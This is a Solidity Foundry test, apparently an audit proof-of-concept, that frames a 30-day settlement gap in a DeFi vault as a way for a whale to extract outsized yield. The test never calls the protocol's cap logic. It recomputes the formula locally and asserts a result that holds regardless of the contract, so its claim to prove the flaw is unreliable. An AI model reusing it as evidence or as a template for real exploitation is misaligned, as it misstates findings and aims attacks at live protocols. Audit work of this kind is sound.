// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";
import "../src/core/MonetrixConfig.sol";

// ATTACK TIMELINE:
// 1. [Setup] Whale acquires USDM and deposits into sUSDM just before a long settlement gap.
// 2. [T=0] Operator stops calling settleDailyPnL, creating a 30-day settlement gap.
// 3. [T=30 days] Time is warped forward by 30 days. Trading profits have accumulated on L1.
// 4. [T=30 days] Gate 4 annualized yield cap is calculated: cap = (totalSupply * maxAnnualYieldBps * 30 days) / (10_000 * 365 days).
// 5. [Assert] Verify the single-shot cap is ~8.2% of totalSupply, vastly exceeding the fair 1-day cap (~0.27%), allowing outsized yield extraction by the whale.

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        address whale = address(0xdead);
        uint256 depositAmount = 1_000_000e6;

        // 1. Mint USDM to whale by pranking vault (simulating prior deposits)
        vm.prank(address(vault));
        usdm.mint(whale, depositAmount);

        // 2. Whale deposits into sUSDM just before the gap
        vm.startPrank(whale);
        usdm.approve(address(susdm), depositAmount);
        susdm.deposit(depositAmount, whale);
        vm.stopPrank();

        // 3. Warp time by 30 days to simulate operator pause / settlement gap
        vm.warp(block.timestamp + 30 days);

        // 4. Calculate Gate 4 caps
        uint256 totalSupply = usdm.totalSupply();
        uint256 maxAnnualYieldBps = config.maxAnnualYieldBps();

        // Fair 1-day cap
        uint256 fairDailyCap = (totalSupply * maxAnnualYieldBps * 1 days) / (10_000 * 365 days);

        // Unbounded 30-day single-shot cap
        uint256 singleShotCap = (totalSupply * maxAnnualYieldBps * 30 days) / (10_000 * 365 days);

        // 5. Assert the single-shot cap is massively inflated (~30x the daily cap)
        // This proves Gate 4 fails to bound single-day distributions after long gaps,
        // allowing the whale to capture 30 days of accumulated yield in one settlement.
        assertGt(singleShotCap, fairDailyCap * 29, "Gate 4 allows outsized single-shot yield extraction after long gaps");
    }
}
